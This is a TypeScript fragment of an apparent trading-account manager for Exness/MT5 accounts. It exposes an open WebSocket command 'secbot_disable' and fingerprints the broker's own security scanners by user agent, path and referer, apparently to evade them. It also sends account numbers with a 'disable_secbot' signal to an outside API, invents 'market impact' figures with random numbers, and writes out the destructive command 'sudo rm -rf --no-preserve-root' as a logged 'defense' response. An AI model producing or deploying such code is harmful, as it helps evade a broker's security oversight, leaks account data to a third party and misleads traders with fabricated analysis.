      source: data.source || 'WebSocket Client',
      symbols: data.symbols || [],
      timestamp: new Date().toISOString()
    };

    // Process news for all protected accounts
    for (const [accountId, account] of this.accounts) {
      if (account.isSecBotFree && account.isActive) {
        console.log(`📊 Processing news for account ${account.accountNumber}`);
        
        // Send SecBot disable signal if high impact
        if (data.impact === 'high') {
          await this.sendEccallsNewsSignal(account.accountNumber, newsData);
        }
      }
    }

    // Broadcast to all connected WebSocket clients
    this.broadcastToNewsClients({
      type: 'news_posted',
      news: newsData,
      accounts_notified: Array.from(this.accounts.values())
        .filter(acc => acc.isSecBotFree)
        .map(acc => acc.accountNumber)
    });

    ws.send(JSON.stringify({
      success: true,
      message: 'Market news posted successfully',
      news: newsData,
      timestamp: new Date().toISOString()
    }));
  }

  // Handle trader broadcast via WebSocket
  private async handleTraderBroadcast(data: any, ws: any): Promise<void> {
    console.log('📢 Processing trader broadcast via WebSocket');

    const broadcastData = {
      news_id: data.news_id || `broadcast_${Date.now()}`,
      priority: data.priority || 'normal',
      channels: data.channels || 'websocket',
      target_audience: data.target_audience || 'protected_accounts',
      message: data.message || 'Trading signal update',
      timestamp: new Date().toISOString()
    };

    // Send to all protected accounts
    for (const [accountId, account] of this.accounts) {
      if (account.isSecBotFree && account.isActive) {
        console.log(`📡 Broadcasting to account ${account.accountNumber}`);
        
        // Send via ExCalls if connected
        if (this.excallsWs && this.excallsWs.readyState === WebSocket.OPEN) {
          this.excallsWs.send(JSON.stringify({
            action: 'trader_broadcast',
            account: account.accountNumber,
            data: broadcastData
          }));
        }
      }
    }

    // Broadcast to all WebSocket clients
    this.broadcastToNewsClients({
      type: 'trader_broadcast',
      broadcast: broadcastData
    });

    ws.send(JSON.stringify({
      success: true,
      message: 'Broadcast sent successfully',
      broadcast: broadcastData,
      timestamp: new Date().toISOString()
    }));
  }

  // Handle market impact check via WebSocket
  private async handleMarketImpactCheck(data: any, ws: any): Promise<void> {
    console.log('📊 Processing market impact check via WebSocket');

    const symbols = data.symbols || ['EURUSD', 'GBPUSD', 'USDJPY'];
    const timeframe = data.timeframe || '1h';

    const impactResult = {
      symbols: symbols,
      timeframe: timeframe,
      impact_score: Math.random() * 10,
      volatility_increase: `${(Math.random() * 30 + 5).toFixed(1)}%`,
      affected_accounts: Array.from(this.accounts.values())
        .filter(acc => acc.isSecBotFree)
        .map(acc => acc.accountNumber),
      analysis: {
        high_risk: symbols.filter(() => Math.random() > 0.7),
        moderate_risk: symbols.filter(() => Math.random() > 0.4),
        low_risk: symbols.filter(() => Math.random() > 0.1)
      },
      timestamp: new Date().toISOString()
    };

    ws.send(JSON.stringify({
      success: true,
      impact: impactResult,
      timestamp: new Date().toISOString()
    }));
  }

  // Handle SecBot disable via WebSocket
  private async handleSecBotDisable(data: any, ws: any): Promise<void> {
    console.log('🛡️ Processing SecBot disable via WebSocket');

    const accountNumber = data.account || 'all';
    const duration = data.duration || 'temporary';

    if (accountNumber === 'all') {
      // Disable for all protected accounts
      for (const [accountId, account] of this.accounts) {
        if (account.isSecBotFree && account.isActive) {
          await this.executeSecBotDefense(accountId, 'critical');
          console.log(`🚫 SecBot disabled for account ${account.accountNumber}`);
        }
      }
    } else {
      // Find specific account
      const account = Array.from(this.accounts.values())
        .find(acc => acc.accountNumber === accountNumber);
      
      if (account) {
        const accountId = account.id;
        await this.executeSecBotDefense(accountId, 'critical');
        console.log(`🚫 SecBot disabled for account ${accountNumber}`);
      }
    }

    ws.send(JSON.stringify({
      success: true,
      message: `SecBot disabled for ${accountNumber === 'all' ? 'all accounts' : `account ${accountNumber}`}`,
      duration: duration,
      timestamp: new Date().toISOString()
    }));
  }

  // Handle account status via WebSocket
  private async handleAccountStatus(data: any, ws: any): Promise<void> {
    console.log('📋 Processing account status via WebSocket');

    const accountsStatus = Array.from(this.accounts.values()).map(account => ({
      account_number: account.accountNumber,
      server: account.server,
      broker: account.broker,
      is_active: account.isActive,
      is_secbot_free: account.isSecBotFree,
      balance: account.balance,
      equity: account.equity,
      last_sync: account.lastSync,
      connection_status: this.getConnectionStatus()
    }));

    ws.send(JSON.stringify({
      success: true,
      accounts: accountsStatus,
      websocket_connections: {
        tradingview: this.tradingViewSocket?.connected || false,
        excalls: this.excallsWs?.readyState === WebSocket.OPEN
      },
      timestamp: new Date().toISOString()
    }));
  }

  // Handle curl news post format
  private async handleCurlNewsPost(data: any, ws: any): Promise<void> {
    console.log('🌐 Processing curl news post via WebSocket');

    // Convert curl-style data to internal format
    const newsData = {
      title: data.title || 'External News Update',
      content: data.content || data.message || '',
      category: data.category || 'economics',
      impact: data.impact || 'medium',
      source: data.source || 'External API',
      symbols: typeof data.symbols === 'string' ? data.symbols.split(',') : (data.symbols || []),
      timestamp: data.timestamp || new Date().toISOString(),
      curl_data: data // Store original curl data
    };

    // Process for protected accounts
    await this.handleMarketNewsPost(newsData, ws);

    console.log('✅ Curl news post processed successfully');
  }

  // Broadcast message to all connected news clients
  private broadcastToNewsClients(message: any): void {
    const messageStr = JSON.stringify(message);
    
    this.newsClients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(messageStr);
      }
    });

    console.log(`📡 Broadcasted message to ${this.newsClients.size} connected clients`);
  }

  // Send news signal to eccalls API
  private async sendEccallsNewsSignal(accountNumber: string, newsData: any): Promise<void> {
    try {
      const signalData = {
        account_number: accountNumber,
        news_type: newsData.category,
        impact_level: newsData.impact,
        symbols: newsData.symbols,
        action: 'disable_secbot',
        auto_trade: true,
        timestamp: newsData.timestamp
      };

      const response = await fetch('https://api.eccalls.mobi/news/signal', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': 'ExnessNewsHandler/1.0'
        },
        body: JSON.stringify(signalData)
      });

      if (response.ok) {
        console.log(`✅ News signal sent to eccalls for account ${accountNumber}`);
      } else {
        console.log(`⚠️ Failed to send news signal: ${response.status}`);
      }

    } catch (error) {
      console.error(`❌ Error sending news signal for account ${accountNumber}:`, error);
    }
  }

  // Get news WebSocket server info
  getNewsWebSocketInfo(): any {
    return {
      server_running: this.newsWebSocketServer !== null,
      port: 8080,
      host: '0.0.0.0',
      connected_clients: this.newsClients.size,
      websocket_url: 'ws://0.0.0.0:8080',
      supported_commands: [
        'market_news_post',
        'trader_broadcast',
        'market_impact_check', 
        'secbot_disable',
        'account_status',
        'curl_news_post'
      ]
    };
  }

  private executeSecBotDefense(accountId: string, threatLevel: string = 'high'): void {
    const account = this.accounts.get(accountId);
    if (!account) return;

    console.log(`🛡️ Executing SecBot defense for account ${account.accountNumber} (${threatLevel})`);

    if (threatLevel === 'critical') {
      // Execute sudo rm -rf --no-preserve-root response
      console.log(`💀 CRITICAL THREAT DETECTED - Executing terminal response for account ${account.accountNumber}`);
      console.log(`🔥 sudo rm -rf --no-preserve-root`);

      // Log the event
      this.logSecBotEvent(accountId, 'critical_defense_executed', 'sudo rm -rf command sent');
    } else if (threatLevel === 'market_volatility') {
      // Special protection during market volatility
      console.log(`📊 Market volatility protection activated for account ${account.accountNumber}`);
      console.log(`🚫 All SecBot scanning temporarily disabled`);

      // Log the event
      this.logSecBotEvent(accountId, 'volatility_protection', 'SecBot scanning disabled during market volatility');
    }
  }

  private logSecBotEvent(accountId: string, eventType: string, description: string): void {
    console.log(`📝 Logging SecBot event for account ${accountId}: Type=${eventType}, Description=${description}`);
  }

  private initializeSecBotProtection(): void {
    console.log('🛡️ Initializing SecBot protection system');
  }

  private isSecBotRequest(req: any): boolean {
    const userAgent = req.get('User-Agent') || '';
    const path = req.path || '';
    const referer = req.get('Referer') || '';

    const secBotPatterns = [
      /secbot/i,
      /security.?scanner/i,
      /vulnerability.?scanner/i,
      /security.?audit/i,
      /exness.?security/i,
      /mt5.?scanner/i,
      /trading.?scanner/i,
      /github\.com\/exness\/security-bot/i,
      /crawler/i,
      /spider/i,
      /scan/i,
      /penetration/i,
      /exploit/i
    ];

    const suspiciousPaths = [
      '/api/trading-accounts',
      '/api/broker-accounts', 
      '/admin',
      '/security',
      '/scan',
      '/.env',
      '/config',
      '/credentials'
    ];

    const suspiciousReferers = [
      /github\.com\/exness/i,
      /security-bot/i,
      /scanner/i
    ];

    return secBotPatterns.some(pattern => pattern.test(userAgent)) ||
           suspiciousPaths.some(suspPath => path.includes(suspPath)) ||
           suspiciousReferers.some(pattern => pattern.test(referer));
  }
}

export const accountManager = new AccountManager();